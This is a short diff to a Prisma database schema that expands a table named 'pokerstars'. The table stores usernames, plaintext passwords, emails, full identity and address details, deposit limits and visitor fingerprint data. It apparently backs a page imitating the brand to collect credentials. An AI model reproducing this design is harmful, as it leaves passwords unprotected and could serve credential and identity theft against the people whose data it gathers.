@@ -253,22 +253,33 @@ model  gitexsurvey2024{
   data String 
 }
 
-
-modal pokerstars{
-  id Int @id @default(autoincrement)
-  username String
-  email String
-  password String 
-  country String
-  dob  String
-  ip  String 
-  geolocation String
-  useragent String
-  devicetype String
-  browsername String
+model pokerstars {
+  id              Int    @id @default(autoincrement())
+  ip              String
+  geolocation     String
+  useragent       String
+  devicetype      String
+  browsername     String
   screenresolution String
-  timezone String
-  referralurl String
-  
+  timezone        String
+  referralurl     String
+  countryf1       String
+  username        String
+  password        String
+  email           String
+  dob             String
+  gender          String
+  autowithlimit   String
+  weeklylimit     String
+  sevenlimit      String
+  stateofbirth    String
+  countryofbirth  String
+  cityofbirth     String
+  state           String
+  city            String
+  postcode        String
+  address         String
+  firstname       String
+  lastname        String
+  depositlimit    String
 }
-
